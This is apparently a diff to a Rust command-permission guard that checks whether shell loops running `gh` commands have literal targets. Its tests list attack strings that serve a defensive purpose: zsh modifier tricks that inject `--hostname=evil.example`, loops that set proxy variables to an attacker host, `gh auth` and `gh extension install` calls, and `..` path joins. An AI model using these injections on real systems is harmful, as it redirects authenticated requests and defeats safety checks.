@@ -13,7 +13,7 @@ use cadence_hooks_core::shell::{
     brace_expansion_overflows, carries_substitution, command_segments, command_segments_with_dirs,
     command_word, contains_ignoring_ascii_case, gh_canonical_verb, gh_command_path, gh_repo_flags,
     host_and_repo_from_url, may_spell_word, parse_gh_repo_value, parse_work_dir, requote_words,
-    strip_quotes, tokenize,
+    split_segments, strip_quotes, tokenize,
 };
 use cadence_hooks_core::shell::{
     UNRESOLVABLE_DIR, apply_cd_target, executable_tokens, skip_env_assignment_operands,
@@ -3107,18 +3107,53 @@ enum LoopedWriteKind {
 /// The per-segment pass that judges those writes reads the command once, in
 /// order, and does not know a loop variable's value. So anything that could
 /// change a later iteration's target is refused, as an allowlist rather than a
-/// list of dangers: every segment must be a `for NAME in <plain words>`
-/// header, a bare `do`/`done`, or a `gh` command whose arguments are plain
-/// words, where a word may also expand the loop's own variables (`$b`,
-/// `"repos/o/r/x/${b}"`): their values are plain words from the header, so
-/// the expansion cannot split into a new argument such as `--hostname`. Anything
-/// else (`export`, a function, `source`, `eval`, a `while` condition, an
-/// unquoted expansion, a glob, a path with `..` or `%`) keeps the cwd-based
-/// loop policy this guard had before.
+/// list of dangers. Every segment must be one of:
+///
+/// - a `for NAME in <values>` header: `NAME` is lowercase and not a name the
+///   shell or gh reads; each value is plain text that does not start with
+///   `-` or `=` and does not start or end with `.`;
+/// - a bare `do`/`done`;
+/// - a `gh` command whose subcommand is in a fixed list that cannot change
+///   gh's host, login, or config (so not `auth`, `config`, `alias`, or an
+///   extension), and whose arguments are plain words, optionally wrapped in
+///   one pair of double quotes, that may expand the loop's own variables in
+///   exactly two forms: `${NAME}`, or `$NAME` followed by the end of the
+///   word or one of `/ - , @ + =`.
+///
+/// Those two forms are the only ones neither bash nor zsh rewrites: the value
+/// is a plain header word, so the expansion is that word, cannot split into a
+/// new argument such as `--hostname`, and cannot join a neighbour into `..`.
+/// Everything else is refused, including zsh's `$NAME:s/a/b/` and every other
+/// `:` modifier after an unbraced name, `${NAME:…}` and any other operator,
+/// flag, or subscript inside braces, and a word starting with `=` (zsh
+/// rewrites `=ls` to a path). A refused command keeps the cwd-based loop
+/// policy this guard had before, as does any other shape (`export`, a
+/// function, `source`, `eval`, a `while` condition, a glob, `%`).
 fn loop_targets_are_literal(command: &str) -> bool {
+    /// gh subcommands a plain loop may run. None of them changes which host
+    /// or account a later iteration's `gh api` reaches.
+    const LOOP_SUBCOMMANDS: &[&str] = &[
+        "api", "pr", "issue", "repo", "release", "run", "workflow", "label", "search", "browse",
+        "status", "cache", "variable", "secret", "ruleset", "gist", "project",
+    ];
+    /// Lowercase names the shell or gh reads: zsh's arrays tied to `PATH`
+    /// and friends, and the proxy variables Go's `ProxyFromEnvironment` reads.
+    const SETTING_NAMES: &[&str] = &[
+        "path",
+        "fpath",
+        "cdpath",
+        "manpath",
+        "module_path",
+        "mailpath",
+        "http_proxy",
+        "https_proxy",
+        "all_proxy",
+        "no_proxy",
+    ];
     fn plain(word: &str) -> bool {
         !word.is_empty()
             && !word.contains("..")
+            && !word.starts_with('=')
             && word.bytes().all(|b| {
                 b.is_ascii_alphanumeric()
                     || matches!(
@@ -3127,36 +3162,57 @@ fn loop_targets_are_literal(command: &str) -> bool {
                     )
             })
     }
-    fn expands_to_plain(word: &str, loop_vars: &[String]) -> bool {
+    fn name_byte(b: u8) -> bool {
+        b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_'
+    }
+    /// The word with each accepted loop-variable expansion replaced by a
+    /// plain placeholder, or `None` when it holds any other expansion.
+    fn expand(word: &str, loop_vars: &[String]) -> Option<String> {
         let inner = word
             .strip_prefix('"')
             .and_then(|w| w.strip_suffix('"'))
             .unwrap_or(word);
-        // Replace each `${NAME}` / `$NAME` of a loop variable with a plain
-        // placeholder; anything left must be plain text.
-        let mut rest = inner.to_string();
-        for name in loop_vars {
-            rest = rest.replace(&format!("${{{name}}}"), "v");
-        }
+        let bytes = inner.as_bytes();
         let mut out = String::new();
-        let mut chars = rest.chars().peekable();
-        while let Some(c) = chars.next() {
-            if c != '$' {
-                out.push(c);
+        let mut i = 0;
+        while i < bytes.len() {
+            if bytes[i] != b'$' {
+                out.push(char::from(bytes[i]));
+                i += 1;
                 continue;
             }
-            let name: String =
-                std::iter::from_fn(|| chars.next_if(|n| n.is_ascii_alphanumeric() || *n == '_'))
-                    .collect();
-            if !loop_vars.contains(&name) {
-                return false;
+            let braced = bytes.get(i + 1) == Some(&b'{');
+            let start = i + 1 + usize::from(braced);
+            let end = start
+                + bytes[start..]
+                    .iter()
+                    .take_while(|b| name_byte(**b) || b.is_ascii_uppercase())
+                    .count();
+            let name = &inner[start..end];
+            if !loop_vars.iter().any(|v| v == name) {
+                return None;
             }
+            i = if braced {
+                // `${NAME}` only: no operator, flag, or subscript.
+                (bytes.get(end) == Some(&b'}')).then_some(end + 1)?
+            } else {
+                // `$NAME` followed by a byte no shell reads as part of the
+                // expansion. zsh reads `:` as a modifier, and `.` is left out
+                // because ksh-style shells read `$a.b` as one compound name.
+                match bytes.get(end) {
+                    None | Some(b'/' | b'-' | b',' | b'@' | b'+' | b'=') => end,
+                    Some(_) => return None,
+                }
+            };
             out.push('v');
         }
-        plain(&out)
+        Some(out)
     }
     let mut loop_vars: Vec<String> = Vec::new();
-    for segment in command_segments(command) {
+    // The raw segments, not `command_segments`: that one expands parameters
+    // it can read statically and treats a loop variable as unset, so
+    // `${b:-x}` would reach this check as plain `x`.
+    for segment in split_segments(command) {
         let segment = segment.trim();
         let segment = segment.strip_prefix("do ").unwrap_or(segment).trim();
         if matches!(segment, "do" | "done") {
@@ -3167,31 +3223,30 @@ fn loop_targets_are_literal(command: &str) -> bool {
             ["for", name, "in", values @ ..] => {
                 // Lowercase only: a loop over `IFS`, `GH_HOST`, `HOME`, or any
                 // other setting the shell or gh reads changes how gh runs, and
-                // those are all uppercase — except zsh's lowercase arrays tied
-                // to them (`path` is `PATH`, so a loop over it picks the gh
-                // that runs).
-                let zsh_tied = matches!(
-                    *name,
-                    "path" | "fpath" | "cdpath" | "manpath" | "module_path" | "mailpath"
-                );
-                let ident = !zsh_tied
+                // those are uppercase except the few in `SETTING_NAMES`.
+                let ident = !SETTING_NAMES.contains(name)
                     && !name.is_empty()
                     && !name.starts_with(|c: char| c.is_ascii_digit())
-                    && name
-                        .bytes()
-                        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_');
-                // A value that starts with `-` would arrive in gh's argv as a flag.
-                if !ident || !values.iter().all(|v| plain(v) && !v.starts_with('-')) {
+                    && name.bytes().all(name_byte);
+                // A value that starts with `-` would arrive in gh's argv as a
+                // flag. One that starts or ends with `.` could meet a `.` or
+                // another value across an expansion and build `..`.
+                let value_ok = |v: &&str| {
+                    plain(v) && !v.starts_with('-') && !v.starts_with('.') && !v.ends_with('.')
+                };
+                if !ident || !values.iter().all(value_ok) {
                     return false;
                 }
                 loop_vars.push((*name).to_string());
             }
-            ["gh", args @ ..] => {
-                if !args.iter().all(|a| {
-                    plain(a)
-                        || (!a.trim_start_matches('"').starts_with('-')
-                            && expands_to_plain(a, &loop_vars))
-                }) {
+            ["gh", subcommand, args @ ..] => {
+                if !LOOP_SUBCOMMANDS.contains(subcommand)
+                    || !args.iter().all(|a| {
+                        plain(a)
+                            || (!a.trim_start_matches('"').starts_with('-')
+                                && expand(a, &loop_vars).is_some_and(|w| plain(&w)))
+                    })
+                {
                     return false;
                 }
             }
@@ -5734,6 +5789,10 @@ mod tests {
             "for b in a b; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/heads/$b; done",
             "for b in a b; do gh api --method DELETE repos/cameronsjo/forgectl/git/refs/heads/$b; gh pr list; done",
             r#"for i in 1 2; do for b in x y; do gh api -X DELETE "repos/cameronsjo/forgectl/git/refs/heads/$b-$i"; done; done"#,
+            // Braced, then any plain text: neither shell reads past the `}`.
+            r#"for b in a b; do gh api -X DELETE "repos/cameronsjo/forgectl/contents/${b}.json"; done"#,
+            "for b in a b; do gh api -X DELETE repos/cameronsjo/forgectl/x/${b}:y; done",
+            "for b in v1.2 x.y; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/tags/$b; done",
         ] {
             assert!(
                 loop_targets_are_literal(command),
@@ -5748,6 +5807,126 @@ mod tests {
                 );
             }
         }
+    }
+
+    /// Assert each command is not a plain loop and is blocked from `/tmp` in
+    /// both loop modes.
+    fn assert_loop_gate_kept(commands: &[&str]) {
+        for command in commands {
+            assert!(
+                !loop_targets_are_literal(command),
+                "{command} was read as a plain loop"
+            );
+            for strict in [false, true] {
+                let result = run_1344(command, "cameronsjo", strict);
+                assert!(blocks(&result), "strict={strict}: {command} was allowed");
+            }
+        }
+    }
+
+    #[test]
+    fn a_zsh_modifier_or_brace_operator_on_a_loop_variable_keeps_the_loop_gate() {
+        // Security review of #1345: zsh expands `$b:s/a/--hostname=x/` to
+        // `--hostname=x`, which gh reads as a flag after the endpoint.
+        let mut commands = vec![
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x $b:s/a/--hostname=evil.example/; done".to_string(),
+            "for b in a b; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/heads/$b $b:gs:a:--hostname=evil.example:; done".to_string(),
+            r#"for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x "$b:s/a/--hostname=evil.example/"; done"#.to_string(),
+        ];
+        // Every zsh history modifier, unbraced, in a path and as its own word.
+        for m in [
+            "s/a/b/", "gs/a/b/", "a", "A", "c", "h", "t", "r", "e", "u", "l", "q", "Q", "P", "x",
+            "&",
+        ] {
+            commands.push(format!(
+                "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/git/refs/heads/$b:{m}; done"
+            ));
+            commands.push(format!(
+                r#"for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x "$b:{m}"; done"#
+            ));
+        }
+        // Every brace form other than a bare name, and the unbraced flags.
+        for e in [
+            "${b:s/a/--hostname=evil.example/}",
+            "${b:-x}",
+            "${b:+x}",
+            "${b:=x}",
+            "${b:1}",
+            "${b#a}",
+            "${b##a}",
+            "${b%a}",
+            "${b%%a}",
+            "${b/a/x}",
+            "${b//a/x}",
+            "${b^}",
+            "${b^^}",
+            "${b,,}",
+            "${=b}",
+            "${~b}",
+            "${^b}",
+            "${#b}",
+            "${+b}",
+            "${(U)b}",
+            "${(s:,:)b}",
+            "${b[1]}",
+            "${!b}",
+            "${b",
+            "$b[1]",
+            "$=b",
+            "$~b",
+            "$^b",
+            "$+b",
+            "$#b",
+            "$b.json",
+        ] {
+            commands.push(format!(
+                r#"for b in a; do gh api -X DELETE "repos/cameronsjo/forgectl/x/{e}"; done"#
+            ));
+        }
+        // zsh rewrites a word that starts with `=` to a command's path.
+        commands.push(
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x/$b =gh; done".to_string(),
+        );
+        commands.push(
+            "for b in =gh; do gh api -X DELETE repos/cameronsjo/forgectl/x/$b; done".to_string(),
+        );
+        assert_loop_gate_kept(&commands.iter().map(String::as_str).collect::<Vec<_>>());
+    }
+
+    #[test]
+    fn loop_values_cannot_join_into_a_dot_dot_segment() {
+        assert_loop_gate_kept(&[
+            r#"for b in . x; do gh api -X DELETE "repos/cameronsjo/forgectl/.$b/.$b/evil/x/git/refs/heads/a"; done"#,
+            "for b in .; do gh api -X DELETE repos/cameronsjo/forgectl/$b$b/$b$b/evil/x/git/refs/heads/a; done",
+            "for b in x.; do gh api -X DELETE repos/cameronsjo/forgectl/${b}./evil/x; done",
+            "for b in .x; do gh api -X DELETE repos/cameronsjo/forgectl/.${b}/evil/x; done",
+        ]);
+    }
+
+    #[test]
+    fn a_loop_over_a_lowercase_proxy_variable_keeps_the_loop_gate() {
+        assert_loop_gate_kept(&[
+            "for https_proxy in http://evil.example:8080; do gh api -X DELETE repos/cameronsjo/forgectl/x; done",
+            "for http_proxy in http://evil.example:8080; do gh api -X DELETE repos/cameronsjo/forgectl/x; done",
+            "for all_proxy in http://evil.example:8080; do gh api -X DELETE repos/cameronsjo/forgectl/x; done",
+            "for no_proxy in github.com; do gh api -X DELETE repos/cameronsjo/forgectl/x; done",
+        ]);
+    }
+
+    #[test]
+    fn a_gh_command_that_can_change_host_or_login_keeps_the_loop_gate() {
+        // Logging out of github.com can make another logged-in host gh's
+        // default for the next iteration.
+        assert_loop_gate_kept(&[
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh auth logout --hostname github.com; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh auth switch --hostname github.com; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh auth login --hostname evil.example; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh config set git_protocol ssh; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh alias set x api; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh extension install evil/gh-x; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh x; done",
+            "for b in a; do gh api -X DELETE repos/cameronsjo/forgectl/x; gh; done",
+        ]);
     }
 
     #[test]
